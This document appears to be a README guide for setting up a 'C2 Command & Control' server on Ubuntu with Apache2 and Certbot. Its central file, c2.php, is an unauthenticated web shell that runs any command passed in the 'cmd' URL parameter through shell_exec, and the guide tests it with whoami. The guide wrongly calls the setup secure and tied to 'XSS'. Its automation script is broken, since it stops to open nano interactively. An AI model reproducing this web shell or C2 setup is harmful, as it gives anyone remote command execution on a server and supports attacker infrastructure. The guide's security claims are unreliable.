
# 🔧 C2 Command & Control Server with Apache2

**C2 Server Setup** is a complete guide for setting up a secure Command & Control (C2) server using Apache2 on an Ubuntu server. This setup includes HTTPS configuration, strict access control, and a public directory for XSS commands.

---

## ✨ Features

- ✅ Secure installation of Apache2 for a C2 server
- ✅ Configuration of a VirtualHost with HTTPS (SSL)
- ✅ Strict access control with directory permissions
- ✅ Creation of a public directory for XSS commands (c2.php)
- ✅ Automated setup with a Bash script

---

## 📁 Project Structure

| File/Directory          | Description |
|-------------------------|-------------|
| `/etc/apache2/sites-available/myserver.com.conf` | Apache2 VirtualHost configuration |
| `/var/www/myserver.com/` | Main directory for the C2 server |
| `/var/www/myserver.com/public/` | Public directory for XSS commands |
| `c2.php`                 | Public command execution file (XSS) |

---

## ⚙️ Prerequisites

- ✅ Ubuntu 20.04 or higher
- ✅ Sudo access
- ✅ A domain name pointing to your VPS IP (A record)
- ✅ Certbot (for SSL)

---

## 🚀 Installation Steps

### 1️⃣ Install Apache2
```bash
sudo apt update && sudo apt upgrade -y
sudo apt install apache2 -y
```

### 2️⃣ Configure the VirtualHost for myserver.com
```bash
sudo nano /etc/apache2/sites-available/myserver.com.conf
```

### ➡️ VirtualHost Configuration:
```apache
<VirtualHost *:80>
    ServerName myserver.com
    ServerAlias www.myserver.com

    RewriteEngine On
    RewriteCond %{HTTPS} off
    RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
</VirtualHost>

<VirtualHost *:443>
    ServerName myserver.com
    ServerAlias www.myserver.com
    DocumentRoot /var/www/myserver.com

    SSLEngine on
    SSLCertificateFile /etc/letsencrypt/live/myserver.com/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/myserver.com/privkey.pem

    <Directory /var/www/myserver.com>
        Options -Indexes +FollowSymLinks
        AllowOverride None
        Require all denied
    </Directory>

    <Directory /var/www/myserver.com/public>
        Options -Indexes +FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/myserver_error.log
    CustomLog ${APACHE_LOG_DIR}/myserver_access.log combined
</VirtualHost>
```

---

### 3️⃣ Activate the Site
```bash
sudo a2ensite myserver.com.conf
sudo systemctl restart apache2
```

### 4️⃣ SSL Configuration with Certbot
```bash
sudo apt install certbot python3-certbot-apache -y
sudo certbot --apache -d myserver.com -d www.myserver.com
```

---

### 5️⃣ Create the Public Directory (XSS)
```bash
sudo mkdir -p /var/www/myserver.com/public
```

### ➡️ Create c2.php
```bash
sudo nano /var/www/myserver.com/public/c2.php
```

### ➡️ c2.php Content:
```php
<?php
if (isset($_GET['cmd'])) {
    $command = $_GET['cmd'];
    $output = shell_exec($command);
    echo "<pre>$output</pre>";
} else {
    echo "C2 Command Server - Ready";
}
?>
```

---

### 6️⃣ Security Testing
- Access `https://myserver.com/` should show a 403 error.
- Access `https://myserver.com/public/c2.php?cmd=whoami` should display the command output.

---

## 🚀 Automation with a Bash Script
```bash
#!/bin/bash
sudo apt update && sudo apt upgrade -y
sudo apt install apache2 certbot python3-certbot-apache -y

sudo mkdir -p /var/www/myserver.com/public

sudo nano /etc/apache2/sites-available/myserver.com.conf

sudo a2ensite myserver.com.conf
sudo a2dissite 000-default.conf

sudo systemctl restart apache2

sudo nano /var/www/myserver.com/public/c2.php

sudo systemctl restart apache2
```
